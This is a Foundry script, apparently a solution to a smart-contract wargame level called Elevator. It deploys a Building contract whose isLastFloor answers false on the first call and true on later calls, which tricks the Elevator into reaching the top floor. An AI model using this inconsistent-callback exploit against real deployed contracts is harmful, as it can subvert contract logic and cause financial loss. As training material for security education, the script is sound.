pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Elevator} from "../src/Elevator.sol";

contract script_Elevator is Script
{
    address elevatorAddr; // assign instance address

    function run() external
    {
        vm.startBroadcast();

        Building building = new Building();
        building.callGoTo(elevatorAddr, 5);

        vm.stopBroadcast();
    }
}

contract Building
{
    uint callCount;

    function isLastFloor(
        uint256
    ) external returns (bool)
    {
        if (callCount == 0)
        {
            callCount ++;
            return false;
        }
        else
        {
            return true;
        }
    }

    function callGoTo(
        address elevator,
        uint floor
    ) external
    {
        Elevator(elevator).goTo(floor);
    }
}